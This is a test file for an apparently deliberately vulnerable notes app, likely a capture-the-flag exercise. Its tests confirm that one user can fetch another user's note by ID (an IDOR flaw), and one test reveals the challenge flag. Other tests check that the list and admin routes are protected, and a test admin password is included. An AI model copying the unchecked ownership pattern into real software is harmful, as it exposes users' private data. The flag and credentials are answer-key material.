const request = require('supertest')
const { createTestApp, cleanup, registerAndLogin, loginAs } = require('./helpers')

let app

beforeEach(() => { app = createTestApp() })
afterEach(() => cleanup(app))

// The vulnerability: GET /api/notes/:id returns any note regardless of ownership

test('VULN: non-owner can access another user note via IDOR', async () => {
  const token = await registerAndLogin(app, 'attacker@example.com', 'pass')
  // alice's note is id=2; attacker registered, not alice
  const res = await request(app)
    .get('/api/notes/2')
    .set('Authorization', `Bearer ${token}`)
  expect(res.status).toBe(200)
  expect(res.body.title).toBe('Shopping List')
})

test('VULN: non-admin can access admin private note (id=1) via IDOR', async () => {
  const token = await registerAndLogin(app, 'evil@example.com', 'pass')
  const res = await request(app)
    .get('/api/notes/1')
    .set('Authorization', `Bearer ${token}`)
  expect(res.status).toBe(200)
  expect(res.body.content).toContain('NoteNest{IDOR_3asy_4ccess}')
})

// The secure endpoint: /api/notes (list) does NOT expose other users' notes

test('SECURE: GET /api/notes does not return notes of other users', async () => {
  const token = await registerAndLogin(app, 'safe@example.com', 'pass')
  const res = await request(app)
    .get('/api/notes')
    .set('Authorization', `Bearer ${token}`)
  expect(res.status).toBe(200)
  const ids = res.body.map(n => n.id)
  expect(ids).not.toContain(1)
  expect(ids).not.toContain(2)
  expect(ids).not.toContain(3)
})

test('SECURE: GET /admin requires admin role (403 for regular user)', async () => {
  const token = await registerAndLogin(app, 'user@example.com', 'pass')
  const res = await request(app)
    .get('/admin')
    .set('Authorization', `Bearer ${token}`)
  expect(res.status).toBe(403)
})

test('SECURE: admin can access /admin', async () => {
  const token = await loginAs(app, 'admin@notenest.local', 'AdminPass1!')
  const res = await request(app)
    .get('/admin')
    .set('Authorization', `Bearer ${token}`)
  expect(res.status).toBe(200)
})
